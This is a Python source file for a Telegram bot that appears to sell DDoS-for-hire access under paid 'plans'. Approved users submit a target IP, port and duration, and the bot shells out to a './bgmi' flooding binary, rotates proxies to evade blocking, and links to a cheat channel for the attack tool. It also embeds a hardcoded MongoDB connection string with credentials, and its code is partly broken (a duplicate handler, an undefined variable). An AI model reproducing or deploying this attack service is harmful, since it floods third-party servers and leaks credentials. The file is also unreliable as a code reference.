import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from subprocess import Popen
from threading import Thread
import asyncio
import aiohttp
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from config import BOT_TOKEN, GROUP_ID, OWNER_USERNAME
loop = asyncio.get_event_loop()

TOKEN = 'BOT_TOKEN'
MONGO_URI = 'mongodb+srv://VENOMxCRAZY:CRAZYxVENOM@cluster0.ythilmw.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&tlsAllowInvalidCertificates=true'
FORWARD_CHANNEL_ID = [GROUP_ID]
CHANNEL_ID = {GROUP_ID}
error_channel_id = {GROUP_ID}

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['VENOM']
users_collection = db.users

bot = telebot.TeleBot(BOT_TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list

async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

def update_proxy():
    proxy_list = [
        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration, threads):
    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} {threads}")
    await process.communicate()

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*𝗔𝗰𝗰𝗲𝘀𝘀 𝗻𝗼𝘁 𝗙𝗼𝘂𝗻𝗱 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿.*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗙𝗼𝗿𝗺𝗮𝘁 𝗨𝘀𝗲 /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        if plan == 1:  # Instant Plan 🧡
            if users_collection.count_documents({"plan": 1}) >= 99:
                bot.send_message(chat_id, "*𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙛𝙖𝙞𝙡𝙚𝙙: 𝘼𝙩𝙩𝙖𝙘𝙠1 𝙋𝙡𝙖𝙣 𝙡𝙞𝙢𝙞𝙩 𝙧𝙚𝙖𝙘𝙝𝙚𝙙 (99 users).*", parse_mode='Markdown')
                return
        elif plan == 2:  # Instant++ Plan 💥
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(chat_id, "*𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙛𝙖𝙞𝙡𝙚𝙙: 𝘼𝙩𝙩𝙖𝙘𝙠2 𝙋𝙡𝙖𝙣 𝙡𝙞𝙢𝙞𝙩 𝙧𝙚𝙖𝙘𝙝𝙚𝙙 (499 users).*", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"𝐔𝐬𝐞𝐫 {target_user_id} 𝐚𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐰𝐢𝐭𝐡 𝐩𝐥𝐚𝐧 {plan} 𝐅𝐨𝐫 {days} 𝐃𝐚𝐲𝐬.*"
    else:  # disapprove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*𝐔𝐬𝐞𝐫 {target_user_id} 𝐃𝐢𝐬𝐚𝐩𝐩𝐫𝐨𝐯𝐞𝐝.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "𝐘𝐨𝐮 𝐀𝐫𝐞 𝐍𝐨𝐭 𝐚𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐨𝐰𝐧𝐞𝐫")
            return

        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, "𝘼𝙩𝙩𝙖𝙘𝙠1 𝙉𝙤𝙩 𝙖𝙡𝙡𝙤𝙬𝙚𝙙 🥲 𝙇𝙞𝙢𝙞𝙩 𝙧𝙚𝙖𝙘𝙝𝙚𝙙.")
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, "𝘼𝙩𝙩𝙖𝙘𝙠2 𝙉𝙤𝙩 𝙖𝙡𝙡𝙤𝙬𝙚𝙙 🥲 𝙇𝙞𝙢𝙞𝙩 𝙧𝙚𝙖𝙘𝙝𝙚𝙙.")
            return

        bot.send_message(chat_id, "𝗘𝗡𝗧𝗘𝗥 𝗧𝗛𝗘 𝗧𝗔𝗥𝗚𝗘𝗧 𝗜𝗣, 𝗣𝗢𝗥𝗧, 𝗧𝗶𝗠𝗲 (in seconds) 𝗮𝗻𝗱 𝘁𝗵𝗿𝗲𝗮𝗱𝘀 𝗦𝗮𝗽𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲.")
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*𝘼𝙘𝙘𝙚𝙨𝙨 𝙣𝙤𝙩 𝙛𝙤𝙪𝙣𝙙❌*", parse_mode='Markdown')
            return

        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, "*𝘼𝙩𝙩𝙖𝙘𝙠2 𝙉𝙤𝙩 𝙖𝙡𝙡𝙤𝙬𝙚𝙙 🥲 𝙇𝙞𝙢𝙞𝙩 𝙧𝙚𝙖𝙘𝙝𝙚𝙙*", parse_mode='Markdown')
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, "*𝘼𝙩𝙩𝙖𝙘𝙠2 𝙉𝙤𝙩 𝙖𝙡𝙡𝙤𝙬𝙚𝙙 🥲 𝙇𝙞𝙢𝙞𝙩 𝙧𝙚𝙖𝙘𝙝𝙚𝙙*", parse_mode='Markdown')
            return

        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙁𝙤𝙧𝙢𝙖𝙩. 𝙐𝙨𝙚: /bgmi <target_ip target_port time*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*𝙋𝙤𝙧𝙩 {target_port} 𝙞𝙨 𝙗𝙡𝙤𝙘𝙠𝙚𝙙 𝙐𝙨𝙚 𝙙𝙚𝙛𝙛𝙚𝙧𝙚𝙣𝙩 𝙥𝙤𝙧𝙩.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 ✅ 💥\n\n𝗜𝗣: {target_ip}\n🖲𝗣𝗢𝗥𝗧: {target_port}\n𝗧𝗶𝗠𝗘: {duration}\n𝗧𝗛𝗥𝗘𝗔𝗗𝗦: {threads}\n🗝️𝗦𝗖𝗥𝗶𝗣𝗧 𝗕𝗬: @V3NOM_CHEAT*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Create a markup object
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)

    # Create buttons
    btn1 = KeyboardButton("𝘼𝙩𝙩𝙖𝙘𝙠1")
    btn2 = KeyboardButton("𝘼𝙩𝙩𝙖𝙘𝙠2")
    btn3 = KeyboardButton("𝙃𝙩𝙩𝙥 𝘾𝙖𝙣𝙖𝙧𝙮")
    btn4 = KeyboardButton("𝙈𝙮 𝙞𝙣𝙁𝙤")
    btn5 = KeyboardButton("𝙃𝙚𝙡𝙥")
    btn6 = KeyboardButton("𝙎𝙘𝙧𝙞𝙥𝙩 𝙇𝙞𝙣𝙠")

    # Add buttons to the markup
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)

    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "𝘼𝙩𝙩𝙖𝙘𝙠1":
        bot.reply_to(message, "*𝘼𝙩𝙩𝙖𝙘𝙠1 𝙎𝙚𝙡𝙚𝙘𝙩𝙚𝙙*", parse_mode='Markdown')
    elif message.text == "𝘼𝙩𝙩𝙖𝙘𝙠2":
        bot.reply_to(message, "*𝘼𝙩𝙩𝙖𝙘𝙠2 𝙎𝙚𝙡𝙚𝙘𝙩𝙚𝙙*", parse_mode='Markdown')
        attack_command(message)
    elif message.text == "𝙃𝙩𝙩𝙥 𝘾𝙖𝙣𝙖𝙧𝙮":
        bot.send_message(message.chat.id, "*𝙃𝙩𝙩𝙥 𝘾𝙖𝙣𝙖𝙧𝙮 𝘿𝙤𝙖𝙬𝙡𝙤𝙖𝙙 𝙇𝙞𝙣𝙠: https://t.me/V3NOM_CHEAT/47*", parse_mode='Markdown')
    elif message.text == "𝙈𝙮 𝙞𝙣𝙛𝙤":
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data:
            username = message.from_user.username
            plan = user_data.get('plan', 'N/A')
            valid_until = user_data.get('valid_until', 'N/A')
            current_time = datetime.now().isoformat()
            response = (f"*USERNAME: {username}\n"
                        f"Plan: {plan}\n"
                        f"Valid Until: {valid_until}\n"
                        f"Current Time: {current_time}*")
        else:
            response = "*𝙉𝙤 𝙖𝙘𝙘𝙤𝙪𝙣𝙩 𝙞𝙣𝙛𝙤 𝙛𝙤𝙪𝙣𝙙 𝙥𝙡𝙚𝙖𝙨𝙚 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 𝙤𝙬𝙣𝙚𝙧.*"
        bot.reply_to(message, response, parse_mode='Markdown')
    elif message.text == "𝙃𝙚𝙡𝙥":
        bot.reply_to(message, "*𝘼𝙙𝙙 𝙮𝙤𝙪𝙧 𝙞𝙙 𝙗𝙮 𝙜𝙤 𝙩𝙤 𝙮𝙤𝙪𝙧 𝙜𝙧𝙤𝙪𝙥 𝙩𝙮𝙥𝙚 /add uid 99 99 , 𝙩𝙝𝙚𝙣 𝙨𝙚𝙡𝙚𝙘𝙩 𝙖𝙩𝙩𝙖𝙘𝙠1 𝙤𝙧 2 𝙚𝙣𝙩𝙚𝙧 𝙞𝙥 𝙥𝙤𝙧𝙩 𝙩𝙞𝙢𝙚 𝘁𝗵𝗿𝗲𝗮𝗱𝘀 𝙩𝙤 𝙖𝙩𝙩𝙖𝙘𝙠*", parse_mode='Markdown')
    elif message.text == "𝙎𝙘𝙧𝙞𝙥𝙩 𝙇𝙞𝙣𝙠":
        bot.reply_to(message, "*𝙎𝙘𝙧𝙞𝙥𝙩 𝙇𝙞𝙣𝙠• https://t.me/V3NOM_CHEAT/235*", parse_mode='Markdown')
    else:
        bot.reply_to(message, "*𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙤𝙥𝙩𝙞𝙤𝙣*", parse_mode='Markdown')

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
